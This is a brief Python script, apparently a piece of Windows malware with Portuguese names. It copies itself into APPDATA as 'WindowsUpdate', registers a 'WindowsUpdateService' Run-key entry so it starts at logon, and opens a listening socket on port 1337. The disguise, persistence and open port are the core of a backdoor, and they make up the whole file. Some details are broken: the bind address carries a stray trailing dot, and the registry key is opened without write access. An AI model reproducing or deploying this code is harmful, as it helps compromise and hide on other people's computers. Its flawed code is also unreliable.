#ABRIR PORTA

import os
import socket
import shutil
import winreg as reg
import sys

PORTA = 1337
NOME_EXE = "WindowsUpdate"

def persistencia():
    destino = os.path.join(os.getenv("APPDATA"), NOME_EXE)

    if not os.path.exists(destino):
        shutil.copyfile(sys.executable, destino)

        chave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, chave)
            reg.SetValueEx(reg_key, "WindowsUpdateService", 0, reg.REG_SZ, destino)
            reg.CloseKey(reg_key)

        except Exception as error:
            print(error)

def abrir():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0.', PORTA))
    s.listen(1)
    
    while True:
        conn, adr = s.accept()
        conn.close()

if __name__ == "__main__":
    persistencia()
    abrir()